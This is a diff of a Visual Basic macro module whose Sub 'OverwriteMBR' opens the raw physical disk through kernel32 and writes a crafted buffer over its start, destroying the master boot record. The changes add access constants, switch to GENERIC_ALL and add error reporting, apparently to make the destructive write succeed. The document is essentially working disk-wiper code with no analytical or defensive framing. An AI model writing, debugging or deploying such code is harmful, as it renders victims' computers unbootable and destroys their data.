@@ -4,6 +4,17 @@ Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lp
 Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Any) As Long
 Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
 
+Public Const GENERIC_READ = &H80000000
+Public Const GENERIC_WRITE = &H40000000
+Public Const GENERIC_EXECUTE = &H20000000
+Public Const GENERIC_ALL = &H10000000
+Public Const FILE_SHARE_READ = &H1
+Public Const FILE_SHARE_WRITE = &H2
+Public Const CREATE_NEW = 1
+Public Const CREATE_ALWAYS = 2
+Public Const OPEN_EXISTING = 3
+Public Const OPEN_ALWAYS = 4
+Public Const TRUNCATE_EXISTING = 5
 Sub OverwriteMBR()
     Dim hFile As Long
     ReDim buffer(0 To 2097151) As Byte
@@ -32,7 +43,8 @@ Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr
 Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & _
 Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H0) & Chr(&H55) & Chr(&HAA)
 
-    hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ Or FILE_SHARE_WRITE, 0&, OPEN_EXISTING, 0&, 0&)
-    WriteFile hFile, buffer(0), uBound(buffer)+1, bytesWritten, 0&
+    hFile = CreateFile("\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, 0&, OPEN_EXISTING, 0&, 0&)
+    WriteFile hFile, buffer(0), ubound(buffer)+1, bytesWritten, 0&
+	msgbox err.lastdllerror
     CloseHandle hFile
 End Sub
